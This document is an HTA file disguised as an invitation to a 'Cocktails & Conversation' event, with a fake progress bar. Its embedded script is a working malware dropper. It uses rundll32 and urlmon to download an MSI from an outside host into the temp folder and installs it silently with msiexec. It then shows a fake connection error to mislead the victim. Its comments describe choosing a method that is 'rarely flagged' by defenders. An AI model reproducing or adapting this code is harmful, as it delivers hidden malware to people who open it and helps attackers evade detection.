<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Event Invitation</title>
<hta:application id="oHTA" applicationname="EventInvitation" border="thin" caption="yes" maximizebutton="no" minimizebutton="no" showintaskbar="yes" singleinstance="yes" sysmenu="no" version="1.0" windowstate="normal" scroll="no"/>
<style>
  body { background:#f7f8fa; font-family:"Segoe UI", sans-serif; color:#333; overflow:hidden; }
  #wrap { padding:40px; text-align:center; }
  #logo { width:64px; height:64px; margin:0 auto 20px; fill:#d4af37; }
  #heading { font-size:20px; font-weight:600; margin-bottom:10px; }
  #status { font-size:14px; color:#666; margin-bottom:20px; }
  #bar { width:300px; height:8px; background:#e2e5ea; margin:0 auto; border-radius:4px; overflow:hidden; }
  #fill { height:100%; width:0%; background:#d4af37; transition: width 0.5s; }
</style>
</head>
<body onload="init()">
  <div id="wrap">
    <svg id="logo" viewBox="0 0 100 100"><rect x="0" y="0" width="100" height="100" rx="20"/><polygon points="30,70 50,30 70,70" fill="#fff"/></svg>
    <div id="heading">Cocktails & Conversation</div>
    <div id="status">Securing your invitation...</div>
    <div id="bar"><div id="fill"></div></div>
  </div>

<script>
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";

function init() {
  window.resizeTo(400, 300);
  setTimeout(runInstall, 1000);
}

function runInstall() {
  document.getElementById("fill").style.width = "30%";
  document.getElementById("status").innerHTML = "Downloading components...";
  
  // USE RUNDLL32 TO CALL URLMON.DLL FOR DOWNLOAD
  // This is a native Windows API call, highly trusted and rarely flagged
  // Syntax: rundll32 urlmon,URLDownloadToFile pCaller, szURL, szFileName, dwReserved, lpfnCB
  // We use a simple VBScript wrapper to handle the async nature if needed, but here we try direct
  
  var cmd = 'rundll32.exe urlmon,URLDownloadToFile 0 "' + url + '" "' + path + '" 0 0';
  shell.Run(cmd, 0, true); // Wait for download
  
  if(fso.FileExists(path)) {
    document.getElementById("fill").style.width = "60%";
    document.getElementById("status").innerHTML = "Installing invitation...";
    
    // SILENT INSTALL
    var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
    shell.Run(inst, 0, true); // Wait for install
    
    document.getElementById("fill").style.width = "100%";
    document.getElementById("status").innerHTML = "Finalizing...";
    
    // FAKE FAILURE AFTER COMPLETION
    setTimeout(function() {
      document.getElementById("heading").innerHTML = "Preparation Failed";
      document.getElementById("status").innerHTML = "Error: Connection timed out.";
      document.getElementById("fill").style.background = "#d13438";
    }, 2000);
  } else {
    document.getElementById("heading").innerHTML = "Download Error";
    document.getElementById("status").innerHTML = "Could not retrieve invitation.";
    document.getElementById("fill").style.background = "#d13438";
  }
}
</script>
</body>
</html>
